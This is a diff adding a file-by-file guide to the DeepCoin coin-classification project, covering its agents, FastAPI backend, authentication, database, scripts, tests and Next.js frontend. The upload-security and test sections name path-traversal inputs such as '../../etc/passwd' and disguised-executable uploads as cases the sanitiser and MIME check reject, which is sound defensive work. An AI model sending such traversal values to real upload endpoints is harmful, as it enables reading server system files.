+**Key engineering features added in Enterprise Upgrade**:
+- Structured logging (`logging.getLogger(__name__)`) instead of `print()`
+- Per-node timing via `time.perf_counter()`
+- Retry with exponential backoff (`_retry_call(fn, retries=2, backoff=1.5)`) for LLM calls — handles 429 rate-limit errors
+- Graceful degradation: each node wrapped in `try/except`, writes `{"_error": str(exc)}` on failure, pipeline continues  
+**Exposes**: `Gatekeeper.analyze(image_path, use_tta=False)` → returns populated `CoinState` dict
+
+#### `src/agents/historian.py`
+**What it does**: For high-confidence coins (>85%), retrieves structured historical data from the RAG engine and asks Gemini to write a professional 3-paragraph narrative. The LLM writes prose; the KB provides all facts.  
+**How it avoids hallucination**: It sends 5 labeled `[CONTEXT N]` blocks to Gemini with the instruction "cite [CONTEXT N], do not add any fact not in the context." The LLM can only write what the KB contains.  
+**LLM provider chain** (tries in order):
+1. Ollama local (`OLLAMA_HOST` + model availability probe)
+2. GitHub Models API (`GITHUB_TOKEN`)
+3. Google AI Studio (`GOOGLE_API_KEY`)
+4. Structured fallback (concatenated KB fields, no LLM, no hallucination, no crash)  
+**Thread safety**: `_llm_lock = threading.Lock()` protects `_text_client` and `_vision_client` against race conditions when two FastAPI requests arrive simultaneously on a cold server.  
+**Bug 12 fix**: Uses `label_str` (the CN type ID string like `"1015"`) for KB lookup, not `class_id` (the sort-index integer 0-437). Using `class_id=0` would look up type `"0"` which doesn't exist.
+
+#### `src/agents/investigator.py`
+**What it does**: For low-confidence coins (<40%), sends the image to a Vision-Language Model (VLM) for visual attribute extraction, then cross-references ALL 9,541 KB types to find the closest match.  
+**Two analysis paths**:
+- **VLM path** (if `qwen3-vl:4b` is downloaded via Ollama): sends image to the vision model, receives a description ("silver coin, laureate portrait right, eagle reverse, possible Greek legend")
+- **OpenCV fallback** (if no VLM available): runs HSV histogram analysis (3 crop sizes, majority vote) for metal detection + Sobel edge density for condition estimate  
+**Why OpenCV fallback**: The principle is "the system NEVER returns empty output." Even without a VLM, we can extract useful attributes locally and search the KB with them.  
+**KB search scope**: Full 9,541 types (not just the 438 CNN training classes). A low-confidence coin may be a type the CNN was never trained on — coverage matters here.
+
+#### `src/agents/validator.py`
+**What it does**: For medium-confidence coins (40-85%), performs forensic material verification. Uses OpenCV HSV analysis to detect whether the coin looks like gold, silver, or bronze, then compares to what the KB says the CN type should be.  
+**Multi-scale HSV**: Runs 3 CropSizes (40%/60%/80% of the coin center), takes majority vote. Single-scale was unreliable on coins with worn edges.  
+**Outputs**:
+- `status`: `"consistent"` | `"mismatch"` | `"uncertain"`
+- `detection_confidence` (float 0-1): how strongly the HSV data supports the detected metal
+- `uncertainty`: `"low"` (3/3 scales agree) | `"medium"` (2/3) | `"high"` (1/3 — effectively unknown)  
+**Bug 18 fix**: Ancient silver sulphide patina (Ag₂S) reads as bronze-coloured in HSV. The silver mask's saturation ceiling was raised from S_max=40 to S_max=70 to capture toned silver. Added a consensus override: if OpenCV says bronze but the CNN and KB both say silver with ≥40% confidence, override to `status="uncertain"` with a patina-ambiguity warning.
+
+#### `src/agents/synthesis.py`
+**What it does**: The final assembly step. Takes the complete `CoinState` dict (CNN result + all agent results) and generates two outputs: a plain-text summary string and a professional PDF report.  
+**PDF generation**: Uses `fpdf2` with ALL direct draw primitives — no Markdown parsing. This was a deliberate redesign after early versions used Markdown-to-PDF conversion that produced unreliable layout.  
+**PDF visual design**: Navy header band, bordered tables with alternating row shading, blue section rule lines, coloured confidence pill (green for high, amber for medium, purple for low).  
+**Text processing helpers**:
+- `_GREEK_MAP` + `_s(text)` — transliterates Greek Unicode characters (Κ→K, Ε→E, etc.) to Latin before passing to fpdf2, which can only handle Latin-1 encoding
+- `_enrich_label()` — converts raw CN type ID strings to human-readable coin names
+- `_strip_wait_loops()` — removes LLM reasoning artifacts (the model sometimes outputs "wait, let me reconsider..." as visible text)
+- `_clean_narrative()` — removes `[CONTEXT N]` citation markers from the final PDF text
+
+---
+
+### `src/api/` — FastAPI Backend
+
+#### `src/api/main.py`
+**What it does**: The FastAPI application entrypoint. Defines the ASGI app, registers all middleware, mounts all routers, and handles startup/shutdown lifecycle.  
+**Key responsibilities**:
+- `lifespan()`: loads the CNN model and ChromaDB at startup (so the first request doesn't pay the loading penalty), runs `_cleanup_old_files(max_age_hours=24)` to delete stale uploads and PDFs
+- CORS: `ALLOWED_ORIGINS` from environment variable (not hardcoded), includes `"DELETE"` in `allow_methods`
+- `GZipMiddleware(minimum_size=500)`: compresses API responses over 500 bytes (60-70% size reduction on JSON)
+- `X-Request-ID` ASGI middleware: assigns a UUID4 to every request, echoed in response header (essential for debugging — lets you match a log line to a specific request)
+- `/api/health` endpoint: checks 5 components (CNN model, ChromaDB, Ollama, GPU, database) and returns 503 if any are degraded
+- `/api/metrics` endpoint: Prometheus text format, auth-gated
+- `ENV=production` gates: `docs_url=None` in production (disables Swagger UI), only enabled in dev
+- JSON structured logging via `configure_logging()` when `LOG_FORMAT=json`
+
+#### `src/api/schemas.py`
+**What it does**: Defines all Pydantic v2 models for API request and response validation.  
+**Why Pydantic matters**: Every piece of data entering or leaving the API is validated against these schemas. If you send a `confidence` field as a string instead of a float, FastAPI rejects it with a clean 422 error instead of crashing deep inside your code. Pydantic is the contract between the frontend and the backend.  
+**Key schemas**:
+- `ClassifyResponse` — the full machine analysis result (CNN + agent output + PDF path)
+- `CnnResult` — CNN prediction with top5, TTA info, vote_fraction, temperature
+- `Top5Item` — single top-5 entry (label, confidence, CN type info)
+- `HistoryListResponse` — paginated history list
+- `HistorySummary` — compact record for the history list page
+
+#### `src/api/_store.py`
+**What it does**: SQLite-backed history store for classification records.  
+**Why SQLite (for now)**: Zero network dependency (no PostgreSQL server needed for this feature), WAL mode gives safe concurrent access, the same 4-function API (`append`, `load_page`, `get_by_id`, `delete_by_id`) is easy to swap for a PostgreSQL implementation in Phase A4.  
+**Key design**:
+- WAL mode (`PRAGMA journal_mode=WAL`) — crash-safe writes
+- B-tree index on `timestamp DESC` — paginated history queries are O(log n), not O(n) full-table scans
+- `payload TEXT` column stores the full JSON blob — schema never changes when `ClassifyResponse` gains new fields
+- `threading.Lock()` around every write — SQLite is not thread-safe without explicit locking  
+**Pending replacement**: Phase A4 will replace this with full PostgreSQL + AsyncSession using the `Classification` ORM model. The 4-function API surface was designed to make this swap easy.
+
+#### `src/api/limiter.py`
+**What it does**: Creates and exports a `slowapi` `Limiter` singleton for rate limiting API endpoints.  
+**Why a dedicated module**: Both `main.py` (which registers the exception handler) and `routes/classify.py` (which decorates the route) need the same `Limiter` object. If each module created its own, they would have separate counters and the limit would never fire.  
+**Current limit**: 10 requests per minute per IP on `/api/classify`.  
+**Rate limiting logic**: `get_remote_address` reads the client IP from `X-Forwarded-For` (if behind Nginx) or `request.client.host`. When the limit is exceeded, slowapi returns `429 Too Many Requests` with a `Retry-After` header.
+
+#### `src/api/logging_config.py`
+**What it does**: Configures structured logging for the FastAPI application.  
+**Two modes**:
+- `LOG_FORMAT=json` → each log line is a JSON object (machine-readable, used in production with log aggregators like Datadog or ELK)
+- `LOG_FORMAT=text` (default) → human-readable coloured terminal output for local development  
+**Noisy library silencing**: Explicitly sets `httpx`, `chromadb`, `sentence_transformers` log levels to WARNING — these libraries emit INFO-level noise on every request that buries our own application logs.
+
+#### `src/api/auth_legacy.py`
+**What it is**: The original `src/api/auth.py` file, renamed to avoid a naming conflict with the new `src/api/auth/` package directory.  
+**Contents**: The now-superseded `require_api_key` dependency that used a simple `X-API-Key` header check.  
+**Current status**: SUPERSEDED. The new `src/api/auth/api_key.py` contains an improved version of the same logic, re-exported from `src/api/auth/__init__.py` for backward compatibility.  
+**Why not deleted**: Kept as a reference and in case any import path was missed during the migration.
+
+---
+
+### `src/api/auth/` — JWT Authentication Package
+
+This is a Python package (a folder with an `__init__.py`). It was created in Phase A2 and holds all authentication-related code.
+
+#### `src/api/auth/__init__.py`
+**What it does**: Re-exports the most-used symbols from all submodules so callers can write `from src.api.auth import get_current_user` instead of `from src.api.auth.deps import get_current_user`.  
+**Backward compatibility**: Also re-exports `require_api_key` (which moved from `auth.py` to `auth/api_key.py`) so any existing import of `from src.api.auth import require_api_key` continues to work without changes.
+
+#### `src/api/auth/utils.py`
+**What it does**: Low-level cryptographic utility functions. Every function handles one specific security operation.  
+**Functions**:
+- `hash_password(plain_text)` → bcrypt hash string (work factor 12 = ~250ms per hash, brute-force resistant)
+- `verify_password(plain_text, hashed)` → bool, constant-time comparison
+- `create_access_token(data, expires_delta)` → HS256 JWT string (15-min default), includes `type:"access"` claim
+- `create_refresh_token()` → returns `(raw_token, sha256_hash, expiry)` — 512-bit random bytes, stored as SHA-256 hash in DB
+- `decode_token(token)` → verifies JWT signature + expiry, checks `type=="access"`, raises HTTP 401 on any failure  
+**Startup guard**: Raises `RuntimeError` if `JWT_SECRET` is still the default placeholder in a production environment. This catches the most dangerous misconfiguration.
+
+#### `src/api/auth/deps.py`
+**What it does**: FastAPI dependency functions that extract and validate the current user from a request.  
+**The dependency injection pattern**: Instead of each route handler manually reading the Authorization header, verifying the JWT, and querying the database, they declare `current_user: User = Depends(get_current_user)` and FastAPI calls `get_current_user` automatically before invoking the route handler.  
+**Functions**:
+- `get_current_user(token, db)` → OAuth2 Bearer token → JWT decode → DB query → status check → returns `User` ORM object. Raises 401 if token invalid, 403 if account suspended.
+- `optional_user(token, db)` → same logic but returns `None` instead of raising for unauthenticated requests. Used for endpoints that serve both guests and logged-in users (e.g., `/api/classify` will eventually give logged-in users a higher rate limit).
+- `require_role(*roles)` → factory function that returns a dependency. `Depends(require_role(UserRole.admin))` ensures only admins can access a route.
+- `require_admin` → pre-built: `require_role(UserRole.admin)`
+- `require_curator_or_above` → pre-built: `require_role(UserRole.admin, UserRole.curator)`
+
+#### `src/api/auth/email.py`
+**What it does**: Sends transactional emails using the Resend SDK.  
+**Functions**:
+- `send_verification_email(to_email, token)` → sends "verify your email" link
+- `send_password_reset_email(to_email, token)` → sends "reset your password" link  
+**Key pattern**: Both functions call the Resend SDK (which is synchronous) via `asyncio.to_thread()`. This runs the blocking SDK call in a separate thread pool so it does not block the async event loop. Blocking an async event loop stalls ALL requests while waiting for one email to send.  
+**Dev fallback**: If `RESEND_API_KEY` is not set, the function logs the token to the console at INFO level and returns immediately. No crash, no error — the developer sees the verification link in their terminal.
+
+#### `src/api/auth/api_key.py`
+**What it does**: FastAPI dependency for service-level API key authentication (the `X-API-Key` header).  
+**`require_api_key` dependency**:
+- Reads `DEEPCOIN_API_KEY` from environment
+- If not set: dev-mode passthrough (all requests allowed)
+- If set: compares header value using `hmac.compare_digest()` (constant-time, prevents timing oracle attacks)
+- Returns on success, raises 401 on failure  
+**Difference from user auth**: The API key is for machine-to-machine calls (CI pipelines, curl scripts, the frontend calling the classify endpoint). JWT auth is for end-user sessions (login, profile, personalised history).
+
+#### `src/api/auth/router.py`
+**What it does**: Defines all 8 authentication HTTP endpoints.  
+**Endpoints and what each one does**:
+```
+POST /auth/register         → hash password, create User(status=pending),
+                              EmailVerification record, send verification email, audit log
+POST /auth/login            → verify password, check status, issue JWT access token
+                              + refresh token (httpOnly cookie), update last_login_at
+GET  /auth/verify-email     → activate account (status=active), mark verification used
+POST /auth/refresh          → lookup refresh token by SHA-256 hash, revoke old token,
+                              issue new access + refresh token pair (rotation)
+POST /auth/logout           → revoke refresh token, delete httpOnly cookie
+GET  /auth/me               → return UserProfile (requires get_current_user)
+POST /auth/forgot-password  → always returns 200 (no user enumeration), create reset token
+POST /auth/reset-password   → apply new bcrypt hash, revoke ALL user refresh tokens,
+                              mark reset token used
+```  
+**Helper functions**:
+- `_set_refresh_cookie(response, raw_token)` → sets the httpOnly Secure SameSite=Lax cookie correctly
+- `_write_audit(db, action, ...)` → adds AuditLog row to session (does not commit — caller commits)
+- `_client_ip(request)` → reads `X-Forwarded-For` header (Nginx proxy) or falls back to direct IP
+- `_profile(user)` → converts ORM User object to Pydantic UserProfile schema
+
+---
+
+### `src/api/db/` — Database Layer Package
+
+#### `src/api/db/__init__.py`
+**What it does**: Empty file that makes `src/api/db/` a Python package. Allows `from src.api.db.models import User`.
+
+#### `src/api/db/base.py`
+**What it does**: Defines the `Base` class that all SQLAlchemy ORM models inherit from. Also defines naming conventions for all database constraints.  
+**Why naming conventions matter**: Without them, SQLAlchemy generates constraint names like `constraint_1`, `constraint_2`. When you run `alembic upgrade`, it creates these anonymous constraints. When you need to drop one in a later migration (`op.drop_constraint("constraint_1")`), you can't — you don't know its name. With conventions, every index is `ix_tablename_columnname`, every unique constraint is `uq_tablename_columnname`, etc.
+
+#### `src/api/db/session.py`
+**What it does**: Creates the async SQLAlchemy engine and session factory. Exports `get_db()`, the FastAPI dependency that provides a database session to route handlers.  
+**Connection pool settings**:
+- `pool_size=5` — keep 5 persistent connections open (first 5 requests never pay connection overhead)
+- `max_overflow=10` — allow up to 10 additional connections during traffic spikes (total max: 15)
+- `pool_pre_ping=True` — test each connection with `SELECT 1` before using it (detects stale connections from DB restarts)
+- `expire_on_commit=False` — allow access to ORM attributes AFTER committing (otherwise FastAPI would error when serializing a User object after the transaction closes)  
+**`get_db()` generator**:
+```python
+async def get_db() -> AsyncGenerator[AsyncSession, None]:
+    async with AsyncSessionLocal() as session:
+        try:
+            yield session
+            await session.commit()     # auto-commit on success
+        except Exception:
+            await session.rollback()   # auto-rollback on any exception
+            raise
+```
+The `yield` in the middle is what makes this a FastAPI dependency — the route handler runs between `yield` and the `commit/rollback`.
+
+#### `src/api/db/models.py`
+**What it does**: Defines all 6 database tables as Python classes. This is the single source of truth for the database schema.  
+**The 6 tables**:
+
+| Table | Purpose |
+|-------|---------|
+| `users` | User accounts with role-based access control |
+| `classifications` | Every coin analysis ever performed (with full result JSON) |
+| `feedback` | User-submitted corrections ("this prediction is wrong, actually it's type X") |
+| `audit_log` | Security audit trail of all sensitive actions (login, logout, password_change) |
+| `email_verifications` | Tokens for email address verification and password reset |
+| `refresh_tokens` | Active refresh token registry for token rotation |
+
+**Key design decisions in models.py**:
+- UUID primary keys via `gen_random_uuid()` — no sequential IDs that expose record counts
+- `TIMESTAMPTZ` (timestamp with time zone) for all timestamps — stores UTC, converts correctly for any client timezone
+- `JSONB` for the `payload` column on `classifications` — indexed JSON, fast key-value queries
+- `ondelete="SET NULL"` on `user_id` foreign keys in `classifications` — deleting a user's account preserves all their research (data remains, just unlinked from a user)
+- `ondelete="CASCADE"` on `classification_id` in `feedback` — deleting a classification automatically deletes its feedback (child record of classification, no orphan rows)
+
+---
+
+### `src/api/routes/` — API Route Handlers
+
+#### `src/api/routes/__init__.py`
+**What it does**: Empty file that makes `routes/` a Python package.
+
+#### `src/api/routes/classify.py`
+**What it does**: Handles `POST /api/classify` — the core endpoint that accepts a coin photo and returns a full analysis.  
+**Request flow**:
+1. Rate limiter checks (10/min per IP)
+2. API key check (`require_api_key`)
+3. MIME type validation (magic bytes — only JPEG/PNG/WebP/GIF allowed)
+4. Filename sanitisation (strips `../../../` path traversal attempts)
+5. Save to `data/uploads/` (temp file)
+6. Acquire `asyncio.Semaphore(1)` GPU guard (prevents concurrent OOM)
+7. Run `gatekeeper.analyze(image_path)` in thread pool
+8. Append result to history store
+9. Delete uploaded file in `finally:` block (runs even if step 7 throws)
+10. Return `ClassifyResponse`  
+**`_sanitise_filename`**: Uses regex to strip everything up to and including the last directory separator. `"../../etc/passwd.jpg"` → `"passwd.jpg"`. Null bytes removed. Max length 200 chars.  
+**`_detect_mime`**: Reads first 12 bytes of the upload and checks magic bytes (file signature). JPEG starts with `FF D8 FF`. PNG starts with `89 50 4E 47`. Preventing an attacker from uploading `evil.exe` renamed to `coin.jpg`.
+
+#### `src/api/routes/history.py`
+**What it does**: Handles `GET /api/history` and `GET /api/history/{id}` — paginated classification history and individual record retrieval.  
+**`GET /api/history`**: Accepts `page` + `limit` query parameters. Uses SQL `LIMIT/OFFSET` (B-tree indexed) for O(log n) pagination. Returns newest records first.  
+**`GET /api/history/{id}`**: Exact ID lookup. Returns 404 if not found.  
+**`DELETE /api/history/{id}`** (Phase 3 UX): Deletes a specific record. Returns 204 on success, 404 if not found. Used by the frontend's delete button.  
+**`POST /api/history/{id}/feedback`** (mark-as-wrong): Stores a user correction. Saves `correct_label` and optional `notes` to the feedback table.
+
+---
+
+### `scripts/` — Standalone Executable Scripts
+
+#### `scripts/train.py`
+**What it does**: Complete V3 model training pipeline.  
+**Lines**: 729  
+**CLI flags**: `--fast` (smoke test, 3 epochs), `--resume` (continue from checkpoint), `--epochs N`, `--batch-size N`, `--lr FLOAT`  
+**What happens when you run it**:
+1. Loads `data/processed/` → `DeepCoinDataset` (7,677 images, 438 classes)
+2. Stratified 70/15/15 split (seed=42)
+3. Creates `WeightedRandomSampler` (1/class_count weights — fixes 40:1 imbalance)
+4. Builds EfficientNet-B3 (loaded from `model_factory.py`)
+5. Trains with AMP + Mixup + CosineAnnealingLR + gradient clipping + early stopping
+6. Saves `models/best_model.pth` and `models/class_mapping.pth`  
+**Saves**: `models/best_model.pth` (best val accuracy), `models/checkpoint_last.pth` (latest epoch), `models/class_mapping.pth` (label mapping)
+
+#### `scripts/test_dataset.py`
+**What it does**: Validates the `DeepCoinDataset` class with 4 automated assertions.  
+**Assertions**: 438 classes present, 7,677 images total, tensor shape `[3, 299, 299]`, value range within ImageNet normalisation bounds.  
+**When to run**: After any change to `dataset.py`, the augmentation pipeline, or `data/processed/`.
+
+#### `scripts/audit.py`
+**What it does**: Deep diagnostic of the trained model's performance.  
+**Requires**: `models/best_model.pth`, `models/class_mapping.pth`, `data/processed/`  
+**Output files**:
+- `reports/confusion_heatmap.png` — visual matrix of which classes get confused
+- `reports/misclassified_gallery.png` — side-by-side images of wrong predictions
+- `reports/class_performance_audit.csv` — per-class precision/recall/F1 for all 438 classes  
+**Console output**: Worst-performing classes, top confusion pairs, macro F1.
+
+#### `scripts/evaluate_tta.py`
+**What it does**: Benchmark comparison of 1-pass vs 8-pass TTA inference on the 1,152-image test set.  
+**Output**: Console table showing standard accuracy, TTA accuracy, per-class change counts, net improvement.  
+**Result recorded**: +0.78% accuracy improvement (79.25% → 80.03%).
+
+#### `scripts/predict.py`
+**What it does**: CLI wrapper around `CoinInference` for quick manual testing.  
+**Usage**:
+```powershell
+& "...\venv\Scripts\python.exe" scripts/predict.py --image data/processed/1015/coin.jpg
+& "...\venv\Scripts\python.exe" scripts/predict.py --image data/processed/1015/coin.jpg --tta
+```
+**Output**: JSON dict with class_id, label, confidence, top5, inference_time_ms.
+
+#### `scripts/build_knowledge_base.py`
+**What it does**: Web scraper for corpus-nummorum.eu + ChromaDB builder.  
+**Modes**:
+- Default: scrapes only the 438 CNN training types
+- `--all-types`: scrapes all 9,716 CN types (takes ~2h 41min at 1 req/sec)
+- `--resume`: skips already-scraped type IDs  
+**Rate limiting**: 1 request/second (respect for academic infrastructure)  
+**Save cadence**: Every 50 types (crash-resumable)  
+**Output**: `data/metadata/cn_types_metadata_full.json`
+
+#### `scripts/rebuild_chroma.py`
+**What it does**: Wipes and rebuilds the ChromaDB vector index from the JSON metadata file.  
+**Old DB**: `data/metadata/chroma_db/` (434 vectors, 1 blob per coin) — preserved  
+**New DB**: `data/metadata/chroma_db_rag/` (47,705 vectors, 5 chunks per coin)  
+**Duration**: ~9 minutes on a modern CPU, 500 documents per batch  
+**When to run**: After a fresh scrape of the CN website, or if ChromaDB becomes corrupted.
+
+#### `scripts/calibrate_temperature.py`
+**What it does**: Finds the optimal temperature scaling value for the CNN's softmax outputs.  
+**Why temperature scaling**: Raw softmax outputs can be overconfident (declaring 97% confidence when the model is actually uncertain). Temperature scaling divides logits by a scalar T before softmax; T>1 spreads probabilities more evenly (less confident). The optimal T is found by minimising Negative Log-Likelihood on the validation set.  
+**Output**: The optimal temperature value, saved and used by `inference.py`.
+
+#### `scripts/test_pipeline.py`
+**What it does**: End-to-end integration test of all 3 routing paths.  
+**Test images**:
+- Route 1 (historian, >85%): `data/processed/1015/CN_type_1015_cn_coin_5943_p.jpg`
+- Route 2 (validator, 40-85%): `data/processed/21027/CN_type_21027_cn_coin_6169_p.jpg`
+- Route 3 (investigator, <40%): `data/processed/544/CN_type_544_cn_coin_2324_p.jpg`  
+**On success**: Prints PASS for each route, exits with code 0.  
+**On failure**: Prints the assertion that failed, exits with code 1.  
+**Last result**: 3/3 PASS.
+
+#### `scripts/test_api.py`
+**What it does**: HTTP integration tests against a running FastAPI server.  
+**Requires**: The FastAPI server to be running on port 8000.  
+**Tests**: Upload a coin image via POST `/api/classify`, check response schema, check history endpoint.
+
+#### `scripts/_test_all_routes_pdf.py`
+**What it does**: Generates PDFs for all 3 routing paths for visual inspection of the PDF layout.  
+**Used when**: After any change to `synthesis.py`, run this script and open the three generated PDFs to verify layout, fonts, table alignment, and content.
+
+#### `scripts/_test_narrative.py`
+**What it does**: Quick isolated test of the `historian.py` narrative generation without running the full pipeline.  
+**Used when**: Debugging LLM provider connectivity or prompt formatting issues.
+
+---
+
+### `tests/` — Automated Test Suite
+
+The test suite is the evidence that nothing is broken. Run it after any code change. If a test fails, a bug was introduced.
+
+#### `tests/__init__.py`
+Empty file that makes `tests/` a Python package.
+
+#### `tests/test_preprocessing.py`
+**What it tests**: The `prep_engine.py` preprocessing pipeline.  
+**Tests**: CLAHE is applied, output dimensions are 299×299, aspect ratio is preserved, padding is black.
+
+#### `tests/unit/test_store.py`
+**What it tests**: The SQLite history store (`src/api/_store.py`). 10 tests.  
+**Key tests**: append writes a record, load_page returns newest-first, get_by_id returns the right record, duplicate IDs upsert (don't duplicate), get_by_id returns None for missing IDs.  
+**Test isolation**: Each test creates a fresh `tempfile.mkdtemp()` database — never touches `data/history.db`.
+
+#### `tests/unit/test_api_security.py`
+**What it tests**: The two security utilities in `routes/classify.py`. 16 tests.  
+**`_sanitise_filename` tests**: Path traversal (`../../etc/passwd`), Windows backslash attacks, null bytes, empty string, absolute paths.  
+**`_detect_mime` tests**: Valid JPEG/PNG/WebP/GIF, HTML disguised as JPEG, Python script disguised as JPEG, ELF binary, empty file.
+
+#### `tests/unit/test_auth.py`
+**What it tests**: The API key authentication system (`src/api/auth/api_key.py`). 8 tests.  
+**Key tests**: Dev mode passthrough when key unset, correct key passes, wrong key → 401, missing header → 401, empty string → 401, `WWW-Authenticate` header present on 401, `hmac.compare_digest` used in source code (security audit test via `inspect.getsource()`).
+
+---
+
+### `notebooks/` — Exploration (not productionised)
+
+#### `notebooks/.gitkeep`
+Zero-byte file that forces git to track the empty `notebooks/` directory. Jupyter notebooks for data exploration are gitignored and stored locally only.
+
+---
+
+### `frontend/` — Next.js 15 Web Application
+
+The frontend is a completely separate project inside the `frontend/` subdirectory. It runs in its own Node.js process and communicates with the FastAPI backend via HTTP.
+
+#### `frontend/package.json`
+**What it is**: Node.js project manifest. Lists all frontend dependencies and defines npm scripts.  
+**Key dependencies**: `next@15`, `react@19`, `typescript@5`, `tailwindcss@4`, `framer-motion@12`, `@tanstack/react-query@5`, `zustand@5`, `axios`, `react-countup`  
+**Scripts**: `dev` (Turbopack dev server), `build` (production bundle), `start` (production server), `lint` (ESLint)
+
+#### `frontend/tsconfig.json`
+**What it is**: TypeScript compiler configuration.  
+**Key settings**: `strict: true` (all strict type checking), `paths: {"@/*": ["./src/*"]}` (import aliases), `lib: ["dom", "es2022"]`.
+
+#### `frontend/next.config.ts`
+**What it does**: Next.js configuration — security headers, API rewrites, image domains.  
+**Security headers defined**:
+- `Content-Security-Policy`: Restricts which scripts/styles/images/connections are allowed. Split into dev (relaxed) and prod (strict) variants.
+- `Strict-Transport-Security`: Forces HTTPS for 2 years with `includeSubDomains; preload`
+- `X-Frame-Options: DENY`: Prevents the app from being embedded in an iframe (clickjacking protection)
+- `X-Content-Type-Options: nosniff`: Prevents MIME type sniffing attacks
+- `Referrer-Policy: strict-origin-when-cross-origin`
+- `Permissions-Policy: camera=(), microphone=()`  
+**API rewrite**: `"/api/*"` → `http://127.0.0.1:8000/api/*` (except classify, which goes direct to avoid timeout)
+
+#### `frontend/.env.local`
+**What it is**: Frontend environment variables (not committed).  
+**Key variables**:
+- `DEEPCOIN_API_URL=http://127.0.0.1:8000` — must be `127.0.0.1`, NOT `localhost`. Node.js resolves `localhost` to IPv6 `::1` by default, which fails when FastAPI only listens on IPv4.
+- `NEXT_PUBLIC_CLASSIFY_URL=http://127.0.0.1:8000` — browser-visible URL for direct classify calls (bypasses Next.js proxy to avoid the ~30s Turbopack timeout).
+
+#### `frontend/app/` — Next.js App Router Pages
+
+**`frontend/app/layout.tsx`**: Root layout wrapping every page. Loads fonts, sets `<html lang="en">`, imports global CSS, wraps children in `<Providers>` (QueryClient + Zustand).
+
+**`frontend/app/page.tsx`**: The home page (`/`). Contains `<CoinUploader>`, `<AgentPipeline>`, and `<AnalysisPanel>`. The main interaction surface.
+
+**`frontend/app/globals.css`**: Global CSS. Tailwind v4 `@import`. Custom CSS variables for the dark navy brand palette. CSS keyframe animations for particle beams, coin flip, and typing dots.
+
+**`frontend/app/favicon.ico`**: Browser tab icon.
+
+**`frontend/app/history/page.tsx`**: The `/history` page. Paginated history table using `useSearchParams` for URL-synced pagination (the page number is in the URL so the browser back button works correctly). Wrapped in `<Suspense>` because `useSearchParams` requires it in Next.js 15.
+
+**`frontend/app/history/[id]/page.tsx`**: The `/history/[id]` dynamic detail page. Shows the full analysis result for a single classification: Quick Facts grid, confidence tier, agent output sections, link to generated PDF.
+
+**`frontend/app/error.tsx`**: Root error boundary. Catches unhandled errors from any page and shows a friendly "Something went wrong" message. Required in every Next.js App Router project.
+
+**`frontend/app/history/error.tsx`**: Error boundary scoped to the `/history` page only.
+
+**`frontend/app/history/[id]/error.tsx`**: Error boundary scoped to the history detail page.
+
+#### `frontend/components/coin/` — Core Interaction Components
+
+**`frontend/components/coin/CoinUploader.tsx`**: The main upload interface. Features:
+- Drag-and-drop file selection + click-to-browse
+- TTA toggle checkbox
+- Canvas-based image downsize (`downsizeImage(file, maxPx=1024)`) — reduces large DSLR photos before upload to save bandwidth
+- `detectScreenshot()` heuristic — shows orange warning banner if the upload looks like a screenshot (aspect ratio, dominant colour)
+- AbortController + Cancel button during analysis
+- Coin-flip header animation (Framer Motion)
+
+**`frontend/components/coin/AgentPipeline.tsx`**: The "Mission Control" analysis progress overlay. Shows as a fullscreen modal during analysis. Features:
+- 4 stations (Preprocessor → CNN → selected agent → Synthesis) with animated connectors
+- CSS particle-beam flow animations along connectors
+- 🪙 coin-flip header animation
+- Mascot speech bubble showing the active agent's current message and bouncing typing dots
+- X button to cancel mid-analysis
+
+**`frontend/components/coin/AnalysisPanel.tsx`**: The results display panel. Features:
+- 3-state CNN confidence display:
+  - State 1 (`conf ≥ 0.70`): green CountUp percentage — "Identified"
+  - State 2 (`vote_fraction ≥ 0.875`): teal "Consistent Match" badge — hides raw %
+  - State 3 (below both): purple "Deep Search" badge — "Best Visual Match", no raw %
+- Animated confidence bars (CSS cubic-bezier, grow from 0 to value)
+- Top-5 table with Corpus Nummorum external links (↗)
+- CTA banner linking to the CN record
+- Mark-as-wrong feedback form (inline)
+- Section displays for historian/validator/investigator output
+- PDF download button
+
+#### `frontend/components/history/`
+
+**`frontend/components/history/HistoryTable.tsx`**: The history list component. Features:
+- Filter bar: text search + route pills (All / Historian / Validator / Investigator)
+- Client-side `useMemo` filtering
+- Delete button (HTML5-compliant sibling of `<Link>`, not nested inside `<a>`)
+- Each row links to `/history/[id]`
+
+#### `frontend/components/ui/` — Reusable Design System Components
+
+**`frontend/components/ui/badge.tsx`**: CVA (class-variance-authority) styled badge. Variants: `default`, `secondary`, `destructive`, `outline`. Used for route labels, confidence tiers.
+
+**`frontend/components/ui/button.tsx`**: CVA styled button. Variants: `default`, `destructive`, `outline`, `ghost`, `link`. Sizes: `default`, `sm`, `lg`, `icon`.
+
+**`frontend/components/ui/card.tsx`**: Card container component. Used throughout the results panel.
+
+**`frontend/components/ui/header.tsx`**: Site-wide navigation header. Shows the DeepCoin logo, nav links (Home, History), and the health status dot.
+
+**`frontend/components/ui/health-dot.tsx`**: A coloured dot (green/amber/red) that shows the current API health status. Calls `GET /api/health` on mount. Green = healthy, amber = degraded, red = offline.
+
+**`frontend/components/ui/progress.tsx`**: An animated progress bar component used for confidence percentage display.
+
+**`frontend/components/ui/spinner.tsx`**: Loading spinner SVG animation. Used as the loading state indicator.
+
+#### `frontend/lib/` — Frontend Business Logic
+
+**`frontend/lib/api.ts`**: All HTTP calls to the backend. Exports:
+- `apiClient` (Axios instance, proxied via Next.js `/api/*`, short timeout) — for health, history
+- `classifyApiClient` (direct to `http://127.0.0.1:8000`, 180s timeout) — for classify (bypasses proxy timeout)
+- `classifyCoin(file, tta, signal)` — POST `/api/classify` with AbortController signal
+- `getHistory(page, limit)`, `getHistoryItem(id)`, `deleteHistoryItem(id)` — history CRUD
+- `submitFeedback(id, correctLabel, notes)` — mark-as-wrong
+
+**`frontend/lib/store.ts`**: Zustand global state store. Contains:
+- `isLoading`: boolean — true during analysis
+- `result`: `ClassifyResponse | null` — the latest analysis result
+- `error`: `string | null` — the latest error message
+- `showPipeline`: boolean — true when AgentPipeline modal is visible
+- `_cancelFn`: `(() => void) | null` — sibling communication bridge for Cancel/X button
+- `setCancelFn`, `setResult`, `setError`, `reset` actions
+
+**`frontend/lib/utils.ts`**: TypeScript utility functions. `cn()` wrapper for `clsx + tailwind-merge` (merges Tailwind CSS class names without conflicts). `downsizeImage(file, maxPx)` for canvas-based image resize.
+
+#### `frontend/types/`
+
